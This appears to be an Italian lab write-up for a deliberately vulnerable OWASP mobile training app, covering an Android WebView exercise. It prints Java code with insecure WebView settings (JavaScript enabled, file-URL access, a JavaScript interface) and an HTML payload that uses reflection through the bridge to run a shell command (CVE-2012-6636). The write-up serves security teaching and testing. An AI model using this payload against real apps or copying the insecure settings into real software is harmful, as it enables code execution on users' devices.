## OMTG-ENV-005-WEBVIEW-LOCAL

> app/src/main/java/sg/vp/owasp_mobile/OMTG_Android/OMTG_ENV_005_WebView_Local.java

```java
WebView webView = (WebView) findViewById(C0000R.id.webView2);

webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.setWebChromeClient(new WebChromeClient());
webView.addJavascriptInterface(new JavaScriptInterface(), "jsinterface");
webView.loadUrl("file:///android_asset/local.htm");
```

> assets/local.htm

```html
<h1 style="color: #5e9ca0;">This is a local test page loading a remote JavaScript !</h1>

<!--
<img src="file:///storage/emulated/0/Bsd_daemon.jpg">
-->

<div id="div1"></div>

<script>
var String = window.jsinterface.getSomeString();
alert(String);

function execute(cmd){
  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}

execute(['/system/bin/sh','-c','echo \"mstg\" > /storage/emulated/0/mstg.txt']);
</script>
```

- la chiamata a `setJavaScriptEnebled()` permette alla WebView di eseguire codice JavaScript

- la chiamata a `setAllowFileAccessFromFileURLs()` permette l'esecuzione di cross-origin request nel contesto di un URL file schema

- la chiamata a `addJavascriptInterface()` definisce un bridge nativo tra JavaScript e Java

- l'exploit che si basa sul file `local.htm` è applicabile solo
su Android 4.1 o inferiori (CVE-2012-6636).
Mentre per le versioni successive ad Android 4.1 è necessario che i metodi invocati tramite JavaScript abbiano l'annotazione `@JavascriptInterface`



Exploit:

- estrai il file `local.htm` dalla directory `assets/` nell'apk `/data/app/<package-name>/base.apk`

- analizza le operazioni eseguite tramite JavaScript

oppure

- usa il secondo exploit usato per [OMTG-ENV-005-WEBVIEW-REMOTE.md](./README-OMTG-ENV-005-WEBVIEW-REMOTE.md) e identifica i metodi degli oggetti Java accessibili da JavaScript tramite cui puoi eseguire codice arbitrario a livello Java